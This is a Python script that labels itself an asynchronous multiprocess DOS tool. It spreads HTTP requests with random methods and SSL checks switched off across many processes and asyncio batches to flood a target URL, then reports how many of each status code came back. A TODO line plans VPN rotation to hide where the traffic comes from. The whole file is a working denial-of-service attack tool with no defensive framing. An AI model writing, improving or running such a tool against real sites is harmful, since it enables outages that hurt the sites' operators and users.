import argparse
import asyncio
import multiprocessing
import os
import random
import time

import aiohttp
from colorama import Fore, Style
from tqdm.asyncio import tqdm

# TODO:
#  - asyncio semaphore
#  - rotate vpn
#  - tweak TCPConnector


QUEUE_BATCH_SIZE = 20
TTL_DNS_CACHE = 300
TCP_CONNECTOR_LIMIT = None
HTTP_METHODS = (
    'HEAD', 'CONNECT', 'OPTIONS', 'TRACE', 'GET', 'POST', 'PUT', 'PATCH', 'DELETE',
    'PATCH'
)

parser = argparse.ArgumentParser(
    description='Asynchronous multiprocess Python DOS tool.'
)
parser.add_argument(
    '--url',
    type=str,
    dest='url',
    required=True,
    help='Target URL.'
)
parser.add_argument(
    '--method',
    type=str,
    dest='method',
    required=False,
    default='RANDOM',
    choices=HTTP_METHODS + ('RANDOM',),
    help='HTTP method which will be used to send a request. '
         '"RANDOM" means all methods will be randomly used.'
)
parser.add_argument(
    '--req-num',
    type=int,
    dest='req_num',
    required=True,
    help='Number of requests to send.'
)
parser.add_argument(
    '--proc-num',
    type=int,
    dest='proc_num',
    required=False,
    default=2,
    help='Number of processes to use.'
)
parser.add_argument(
    '--semaphore-num',
    type=int,
    dest='semaphore_num',
    required=False,
    default=10,
    help='Semaphore (asyncio) per process.'
)


async def send_request(url, method, session):
    if method == "RANDOM":
        method = random.choice(HTTP_METHODS)
    async with session.request(method, url, ssl=False) as response:
        # We want to suck in the whole response.
        await response.read()
        return response.status


async def handle_batch(url, method, batch, loop):
    tcp_connector = aiohttp.TCPConnector(
        limit=TCP_CONNECTOR_LIMIT,
        ttl_dns_cache=TTL_DNS_CACHE
    )
    async with aiohttp.ClientSession(loop=loop, connector=tcp_connector) as session:
        return await asyncio.gather(
            *[send_request(url, method, session) for _ in range(batch)],
            return_exceptions=True
        )


def daemon_run(receive_queue, send_queue, url, method):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    print(f'PID:{os.getpid()} LOOP:{id(loop)}')

    while True:
        if receive_queue.empty():
            break
        else:
            responses = {}
            batch = receive_queue.get()
            results = loop.run_until_complete(
                handle_batch(url, method, batch, loop)
            )
            for result in results:
                if isinstance(result, Exception):
                    result = result.__class__.__name__
                responses[str(result)] = responses.get(str(result), 0) + 1
            # Send a report back to the master.
            send_queue.put_nowait({
                'count': len(results),
                'responses': responses
            })


def track_responses():
    global q_recv
    global responses
    global responses_count
    global pbar

    while not q_recv.empty():
        report = q_recv.get_nowait()
        for status, amount in report['responses'].items():
            responses[status] = responses.get(status, 0) + amount
        responses_count += report['count']
        pbar.update(report['count'])


if __name__ == '__main__':
    args = parser.parse_args()
    pbar = tqdm(total=args.req_num, colour='green', leave=True)
    # Queues to communicate between master <--> slave processes.
    q_send = multiprocessing.Queue()
    q_recv = multiprocessing.Queue()
    # Split desired requests to batches.
    batches = int(args.req_num / QUEUE_BATCH_SIZE)
    if batches <= 1:
        args.proc_num = 1
    elif batches < args.proc_num:
        args.proc_num = batches
    batch_leftover = args.req_num - QUEUE_BATCH_SIZE * batches
    # Fill the queue.
    for _ in range(batches):
        q_send.put(QUEUE_BATCH_SIZE)
    if batch_leftover:
        q_send.put(batch_leftover)
    # Spawn new processes.
    processes = []
    for _ in range(args.proc_num):
        processes.append(
            multiprocessing.Process(
                daemon=True,
                target=daemon_run,
                args=(q_send, q_recv, args.url, args.method)
            )
        )
        processes[-1].start()
    print(f'{args.proc_num} processes were spawned.')
    # Keep track of all responses.
    responses = {}
    responses_count = 0

    # Listen queue until all processes are done.
    while any(p.is_alive() for p in processes):
        track_responses()
        time.sleep(0.5)
    else:
        track_responses()
    # Close progress bar.
    pbar.close()
    # Join.
    print('Joining processes back to master.')
    for p in processes:
        p.join()
        print(f'{p!r} joined.')
    # Display a report.
    print(f'\n\nReport:')
    for status, amount in responses.items():
        colour_enhance = ''
        if status[0] == "2":
            colour_enhance = Fore.GREEN
        elif status[0] in ("4", "5") or not status[0].isnumeric():
            colour_enhance = Fore.RED
        print(
            f'Status {colour_enhance}{status}{Style.RESET_ALL} - {amount} requests.')
